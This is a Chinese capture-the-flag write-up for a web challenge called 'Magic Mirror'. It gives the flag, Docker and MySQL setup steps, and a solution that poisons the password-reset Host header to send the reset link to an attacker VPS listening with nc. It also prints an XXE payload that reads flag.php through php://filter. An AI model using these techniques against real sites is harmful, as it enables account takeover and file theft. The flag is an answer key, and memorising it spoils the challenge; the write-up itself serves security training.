### 题目类型：Web


#### 中等难度级别题目：

##### 题目名称：
Magic Mirror

##### 题目说明：
不要被表象欺骗，钥匙就藏在数据包中

##### 解题考点：
Host注入修改(注册)密码，进入后台XXE

##### 题目Flag：
D0g3{Hi_D0g3_Res3t_4nd_xXe}  【格式：D0g3{}】

##### 解题思路：
找回密码处抓包，修改host为自己vps的ip:port
在vps用nc 监听ip:port
进入后台后xxe注入
exp:
<?xml version="1.0" encoding="utf-8"?>

<!DOCTYPE entity [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php">
]>
<information>
  <username>&xxe;</username>
</information>

##### 环境搭建文档
	配置过程
	(1). 下载docker镜像 docker pull d0g3/axb-magic-mirror
	(2). 运行镜像 docker run -d -p 8088:80  --name d0g3_magic d0g3/axb-magic-mirror
	(3). 进入镜像 docker exec -ti d0g3_magic /bin/bash
	(4). 数据库配置
	use mysql;
	UPDATE user SET password=PASSWORD('d0g3root123') WHERE user='root';
	FLUSH PRIVILEGES;
	
	// 创建库、表
	create database d0g3;
	use d0g3;
	create table d0g3_users(id int(8) not null primary key auto_increment,username char(20) not null, password char(60) not null);
	
	开放端口: 8088




